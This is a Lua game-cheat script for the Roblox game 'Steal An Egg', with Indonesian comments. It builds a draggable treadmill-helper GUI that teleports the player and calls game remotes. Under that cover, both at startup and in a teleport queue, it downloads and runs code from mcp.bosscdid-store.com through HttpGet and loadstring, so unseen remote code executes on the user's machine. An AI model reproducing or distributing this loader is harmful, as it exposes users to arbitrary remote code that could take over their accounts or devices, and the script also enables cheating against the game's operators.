-- ====================================================================
-- LOADER: Steal An Egg Helper (MCP + Auto-Treadmill + GUI Control)
-- ====================================================================

local queue = queue_on_teleport or (syn and syn.queue_on_teleport) or queueonteleport

local function runHelper()
    -- 1. Hubungkan ke MCP Bridge (mcp.bosscdid-store.com)
    task.spawn(function()
        pcall(function()
            getgenv().BridgeURL = "mcp.bosscdid-store.com"
            loadstring(game:HttpGet("https://mcp.bosscdid-store.com/script.luau"))()
        end)
    end)

    -- 2. Tunggu game siap
    if not game:IsLoaded() then game.Loaded:Wait() end
    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local UserInputService = game:GetService("UserInputService")
    local lp = Players.LocalPlayer

    -- Hapus GUI lama jika ada
    local parentGui = (gethui and gethui()) or (pcall(function() return game:GetService("CoreGui") end) and game:GetService("CoreGui")) or lp:WaitForChild("PlayerGui")
    local oldGui = parentGui:FindFirstChild("TreadmillHelperGUI")
    if oldGui then oldGui:Destroy() end

    -- Format Angka (1000000 -> 1,000,000)
    local function formatNumber(v)
        local n = tonumber(v) or 0
        local formatted = tostring(math.floor(n))
        local k
        while true do
            formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", "%1,%2")
            if k == 0 then break end
        end
        return formatted
    end

    -- Pencari Plot Pemain
    local function findMyPlot()
        local plots = workspace:WaitForChild("Plots", 20)
        if not plots then return nil end
        for _, plot in ipairs(plots:GetChildren()) do
            for _, desc in ipairs(plot:GetDescendants()) do
                if desc:IsA("TextLabel") and desc.Text == lp.Name then
                    return plot
                end
            end
        end
        return nil
    end

    -- ================= MEMBUAT GUI =================
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "TreadmillHelperGUI"
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = parentGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, 230, 0, 195)
    mainFrame.Position = UDim2.new(0.02, 0, 0.35, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 22, 28)
    mainFrame.BorderSizePixel = 0
    mainFrame.ClipsDescendants = true
    mainFrame.Parent = screenGui

    local corner = Instance.new("UICorner", mainFrame)
    corner.CornerRadius = UDim.new(0, 12)

    local stroke = Instance.new("UIStroke", mainFrame)
    stroke.Color = Color3.fromRGB(0, 200, 255)
    stroke.Thickness = 1.4
    stroke.Transparency = 0.3

    -- Title Bar
    local titleBar = Instance.new("Frame")
    titleBar.Name = "TitleBar"
    titleBar.Size = UDim2.new(1, 0, 0, 36)
    titleBar.BackgroundColor3 = Color3.fromRGB(28, 32, 42)
    titleBar.BorderSizePixel = 0
    titleBar.Parent = mainFrame
    local titleCorner = Instance.new("UICorner", titleBar)
    titleCorner.CornerRadius = UDim.new(0, 12)

    local titleText = Instance.new("TextLabel", titleBar)
    titleText.Size = UDim2.new(1, -40, 1, 0)
    titleText.Position = UDim2.new(0, 12, 0, 0)
    titleText.BackgroundTransparency = 1
    titleText.Text = "⚡ Steal An Egg Helper"
    titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleText.TextSize = 13
    titleText.Font = Enum.Font.GothamBold
    titleText.TextXAlignment = Enum.TextXAlignment.Left

    local minBtn = Instance.new("TextButton", titleBar)
    minBtn.Size = UDim2.new(0, 26, 0, 24)
    minBtn.Position = UDim2.new(1, -30, 0, 6)
    minBtn.BackgroundColor3 = Color3.fromRGB(40, 44, 56)
    minBtn.Text = "-"
    minBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
    minBtn.TextSize = 16
    minBtn.Font = Enum.Font.GothamBold
    minBtn.BorderSizePixel = 0
    local minCorner = Instance.new("UICorner", minBtn)
    minCorner.CornerRadius = UDim.new(0, 6)

    -- Content
    local content = Instance.new("Frame", mainFrame)
    content.Name = "Content"
    content.Size = UDim2.new(1, -20, 1, -46)
    content.Position = UDim2.new(0, 10, 0, 42)
    content.BackgroundTransparency = 1

    local statusLabel = Instance.new("TextLabel", content)
    statusLabel.Size = UDim2.new(1, 0, 0, 20)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "Status: 🟢 Di Treadmill"
    statusLabel.TextColor3 = Color3.fromRGB(0, 255, 140)
    statusLabel.TextSize = 11
    statusLabel.Font = Enum.Font.GothamSemibold
    statusLabel.TextXAlignment = Enum.TextXAlignment.Left

    local statsBox = Instance.new("Frame", content)
    statsBox.Size = UDim2.new(1, 0, 0, 68)
    statsBox.Position = UDim2.new(0, 0, 0, 24)
    statsBox.BackgroundColor3 = Color3.fromRGB(15, 17, 22)
    statsBox.BorderSizePixel = 0
    local statsCorner = Instance.new("UICorner", statsBox)
    statsCorner.CornerRadius = UDim.new(0, 8)
    local statsStroke = Instance.new("UIStroke", statsBox)
    statsStroke.Color = Color3.fromRGB(45, 50, 65)

    local speedLabel = Instance.new("TextLabel", statsBox)
    speedLabel.Size = UDim2.new(1, -16, 0, 28)
    speedLabel.Position = UDim2.new(0, 8, 0, 4)
    speedLabel.BackgroundTransparency = 1
    speedLabel.Text = "⚡ Speed: --"
    speedLabel.TextColor3 = Color3.fromRGB(0, 220, 255)
    speedLabel.TextSize = 12
    speedLabel.Font = Enum.Font.GothamMedium
    speedLabel.TextXAlignment = Enum.TextXAlignment.Left

    local moneyLabel = Instance.new("TextLabel", statsBox)
    moneyLabel.Size = UDim2.new(1, -16, 0, 28)
    moneyLabel.Position = UDim2.new(0, 8, 0, 34)
    moneyLabel.BackgroundTransparency = 1
    moneyLabel.Text = "💰 Money/s: --"
    moneyLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
    moneyLabel.TextSize = 12
    moneyLabel.Font = Enum.Font.GothamMedium
    moneyLabel.TextXAlignment = Enum.TextXAlignment.Left

    local actionBtn = Instance.new("TextButton", content)
    actionBtn.Size = UDim2.new(1, 0, 0, 38)
    actionBtn.Position = UDim2.new(0, 0, 0, 102)
    actionBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 60)
    actionBtn.Text = "🚶 Turun Treadmill"
    actionBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    actionBtn.TextSize = 13
    actionBtn.Font = Enum.Font.GothamBold
    actionBtn.BorderSizePixel = 0
    local actionCorner = Instance.new("UICorner", actionBtn)
    actionCorner.CornerRadius = UDim.new(0, 8)

    -- State & Functions
    local isOnTreadmill = true
    local isActionBusy = false

    local function updateUIState(onTreadmill)
        isOnTreadmill = onTreadmill
        if onTreadmill then
            statusLabel.Text = "Status: 🟢 Di Treadmill"
            statusLabel.TextColor3 = Color3.fromRGB(0, 255, 140)
            actionBtn.Text = "🚶 Turun Treadmill"
            actionBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 60)
        else
            statusLabel.Text = "Status: ⚪ Di Luar Treadmill"
            statusLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
            actionBtn.Text = "🏃 Naik Treadmill"
            actionBtn.BackgroundColor3 = Color3.fromRGB(0, 175, 100)
        end
    end

    local function doMountTreadmill()
        if isActionBusy then return end
        isActionBusy = true
        actionBtn.Text = "⏳ Menuju Treadmill..."
        
        local char = lp.Character or lp.CharacterAdded:Wait()
        local hrp = char:WaitForChild("HumanoidRootPart", 10)
        local myPlot = findMyPlot()
        
        if myPlot and hrp then
            local treadmill = myPlot:WaitForChild("TreadmillBottom", 10)
            if treadmill then
                hrp.CFrame = treadmill.CFrame * CFrame.new(0, 3.5, 0)
                task.wait(0.4)
                local ok, Remotes = pcall(require, ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Remotes"))
                if ok and Remotes and Remotes.Treadmill and Remotes.Treadmill.AskWearStill then
                    pcall(function() Remotes.Treadmill.AskWearStill:InvokeServer() end)
                end
                updateUIState(true)
            end
        end
        isActionBusy = false
    end

    local function doDismountTreadmill()
        if isActionBusy then return end
        isActionBusy = true
        actionBtn.Text = "⏳ Turun..."
        
        local ok, Remotes = pcall(require, ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Remotes"))
        if ok and Remotes and Remotes.Treadmill and Remotes.Treadmill.AskDoff then
            pcall(function() Remotes.Treadmill.AskDoff:InvokeServer() end)
        end
        
        local char = lp.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if hrp then
            hrp.CFrame = hrp.CFrame * CFrame.new(0, 0, -8)
        end
        
        updateUIState(false)
        isActionBusy = false
    end

    actionBtn.MouseButton1Click:Connect(function()
        if isOnTreadmill then
            doDismountTreadmill()
        else
            doMountTreadmill()
        end
    end)

    -- Minimize Toggle
    local isMinimized = false
    minBtn.MouseButton1Click:Connect(function()
        isMinimized = not isMinimized
        if isMinimized then
            mainFrame:TweenSize(UDim2.new(0, 230, 0, 36), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2, true)
            content.Visible = false
            minBtn.Text = "+"
        else
            mainFrame:TweenSize(UDim2.new(0, 230, 0, 195), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2, true)
            task.wait(0.15)
            content.Visible = true
            minBtn.Text = "-"
        end
    end)

    -- Dragging
    local dragging, dragInput, dragStart, startPos
    titleBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = mainFrame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    titleBar.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)

    -- Realtime Leaderstats Listener
    task.spawn(function()
        local leaderstats = lp:WaitForChild("leaderstats", 25)
        if not leaderstats then return end
        
        local speedObj = leaderstats:WaitForChild("Speed", 10)
        local moneyObj = leaderstats:WaitForChild("Money/s", 10)
        
        local function updateStats()
            if speedObj then
                speedLabel.Text = "⚡ Speed: " .. formatNumber(speedObj.Value)
            end
            if moneyObj then
                moneyLabel.Text = "💰 Money/s: $" .. formatNumber(moneyObj.Value)
            end
        end
        
        updateStats()
        if speedObj then speedObj.Changed:Connect(updateStats) end
        if moneyObj then moneyObj.Changed:Connect(updateStats) end
    end)

    -- 3. Auto Naik Awal (Saat Masuk / Respawn)
    task.spawn(function()
        task.wait(2)
        doMountTreadmill()
    end)

    lp.CharacterAdded:Connect(function()
        task.wait(2.5)
        doMountTreadmill()
    end)
end

-- Teleport Queue
if queue then
    queue([[
        local bridge = "https://mcp.bosscdid-store.com"
        loadstring(game:HttpGet(bridge .. "/script.luau"))()
    ]])
end

runHelper()
